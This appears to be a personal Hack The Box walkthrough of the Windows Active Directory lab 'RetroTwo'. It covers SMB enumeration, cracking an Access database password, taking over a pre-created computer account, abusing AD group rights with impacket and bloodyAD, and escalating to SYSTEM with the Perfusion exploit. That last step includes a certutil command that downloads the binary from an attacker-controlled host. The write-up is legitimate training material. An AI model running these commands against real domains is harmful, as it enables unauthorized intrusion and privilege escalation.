---
tags:
  - Hacking
  - HTB
  - Boot2Root
  - Windows
---
# Overview

| Name        | RetroTwo  |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/challenge]
└─$ sudo nmap -sC -sV -T4 10.129.46.78
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 11:21 +0545
Nmap scan report for 10.129.46.78
Host is up (0.27s latency).
Not shown: 984 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-12-26 05:37:16Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: -20m14s, deviation: 34m36s, median: -16s
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: BLN01
|   NetBIOS computer name: BLN01\x00
|   Domain name: retro2.vl
|   Forest name: retro2.vl
|   FQDN: BLN01.retro2.vl
|_  System time: 2025-12-26T06:38:17+01:00
| smb2-time:
|   date: 2025-12-26T05:38:18
|_  start_date: 2025-12-26T05:36:13
```
# Enumeration

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nxc smb 10.129.46.78
SMB         10.129.46.78    445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
```

```bash
10.129.46.78    BLN01.retro2.vl retro2.vl BLN01
```

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/challenge]
└─$ netexec smb BLN01.retro2.vl -u guest -p '' --shares --timeout 10
SMB         10.129.46.78    445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.46.78    445    BLN01            [+] retro2.vl\guest:
SMB         10.129.46.78    445    BLN01            [*] Enumerated shares
SMB         10.129.46.78    445    BLN01            Share           Permissions     Remark
SMB         10.129.46.78    445    BLN01            -----           -----------     ------
SMB         10.129.46.78    445    BLN01            ADMIN$                          Remote Admin
SMB         10.129.46.78    445    BLN01            C$                              Default share
SMB         10.129.46.78    445    BLN01            IPC$                            Remote IPC
SMB         10.129.46.78    445    BLN01            NETLOGON                        Logon server share
SMB         10.129.46.78    445    BLN01            Public          READ
SMB         10.129.46.78    445    BLN01            SYSVOL                          Logon server share

┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/challenge]
└─$ smbclient -N //BLN01.retro2.vl/public
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 17 20:15:37 2024
  ..                                  D        0  Sat Aug 17 20:15:37 2024
  DB                                  D        0  Sat Aug 17 17:52:06 2024
  Temp                                D        0  Sat Aug 17 17:43:05 2024

                6290943 blocks of size 4096. 820863 blocks available
smb: \> ls DB\
  .                                   D        0  Sat Aug 17 17:52:06 2024
  ..                                  D        0  Sat Aug 17 17:52:06 2024
  staff.accdb                         A   876544  Sat Aug 17 20:15:19 2024

                6290943 blocks of size 4096. 821121 blocks available
smb: \> get staff.accdb
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \staff.accdb
smb: \> cd DB
smb: \DB\> get staff.accdb
getting file \DB\staff.accdb of size 876544 as staff.accdb (105.1 KiloBytes/sec) (average 105.1 KiloBytes/sec)
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-vdofosgjid]─[~]
└──╼ [★]$ office2john staff.accdb > hash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-vdofosgjid]─[~]
└──╼ [★]$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz 
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-vdofosgjid]─[~]
└──╼ [★]$ john hash --format=office --wordlist=/usr/share/wordlists/rockyou.txt  
class08          (staff.accdb)   
```

Open it you get this in VBA Script:

```bash
strLDAP = "LDAP://OU=staff,DC=retro2,DC=vl"  
strUser = "retro2\ldapreader"  
strPassword = "ppYaVcB5R"
```

```bash
netexec ldap BLN01.retro2.vl -u ldapreader -p ppYaVcB5R --bloodhound --dns-server 10.129.46.78 -c All
```

Looking for an interesting path to the Domain Controller, we can see the following relationships:

- The computer Account FS01 is a member of the Domain Computers group.
- The Domain Computers group has `GenericWrite` over ADMWS01.
- ADMWS01 has the `AddSelf` permission over the Services group.
- Services group members can RDP to the Domain Controller BLN01.

![[Pasted image 20251226113858.png]]
# Initial Foothold
## Pre-Windows 2000 computers

Back in 2022, [TrustedSec](https://trustedsec.com/) made a blog post about [Pre-Created Computer Accounts](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts) that showcased a way to take them over. First, let’s see if that’s the case here using Netexec.

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-vdofosgjid]─[~]
└──╼ [★]$ nxc smb retro2.vl -u 'fs01$' -p 'fs01'
SMB         10.129.46.78    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.46.78    445    BLN01            [-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
```

As you can see, Netexec shows as the following error message: `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`, which means that we have guessed the correct password for a computer account that has not been used yet. Great, now we have found the correct password for FS01. However, we cannot use this computer account yet because the password has not been changed, so let’s do that and then we can Reset ADMWS01$ Password.

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-vdofosgjid]─[~]
└──╼ [★]$ python3 /usr/share/doc/python3-impacket/examples/getTGT.py retro2.vl/fs01\$:fs01
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fs01$.ccache
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-vdofosgjid]─[~]
└──╼ [★]$ KRB5CCNAME=fs01\$.ccache addcomputer.py -computer-name 'ADMWS01$' -computer-pass '0xdf0xdf' -no-add -k -no-pass -dc-host BLN01.retro2.vl 'retro2.vl/FS01$'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully set password of ADMWS01$ to 0xdf0xdf.
```

With access to ADMWS01$, I can add members to the Services group. I’ll use [BloodyAD](https://github.com/CravateRouge/bloodyAD):

Now we can RDP.

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-vdofosgjid]─[~]
└──╼ [★]$ bloodyAD --host BLN01.retro2.vl -d retro2.vl -u 'ADMWS01$' -p 0xdf0xdf add groupMember Services ldapreader
[+] ldapreader added to Services
```

```bash
xfreerdp /u:ldapreader /p:ppYaVcB5R /v:BLN01.retro2.vl /tls-seclevel:0 
```

`user.txt` is at the root of the C: drive.
# Privilege Escalation

Do `systeminfo` in PS in RDP.
## [Perfusion](https://github.com/itm4n/Perfusion)

Searching for a way to escalate our privileges leads us to the following blog posts by [itm4n](https://itm4n.github.io/):

- [https://itm4n.github.io/windows-registry-rpceptmapper-eop/](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [https://itm4n.github.io/windows-registry-rpceptmapper-exploit/](https://itm4n.github.io/windows-registry-rpceptmapper-exploit/)

which explain how to exploit a no-fix vulnerability in the RpcEptMapper registry key and provide us with a tool called [Perfusion](https://github.com/itm4n/Perfusion) that we can run on the target to obtain a system shell. Download pre compiled binary from [here](https://github.com/manesec/Pentest-Binary).

```powershell
certutil.exe -urlcache -f http://10.10.15.6:8000/Perfusion.exe Perfusion.exe
```

```powershell
.\Perfusion.exe -c cmd -i
```

```bash
cb462daa07d7539de053bb9308658759
```

---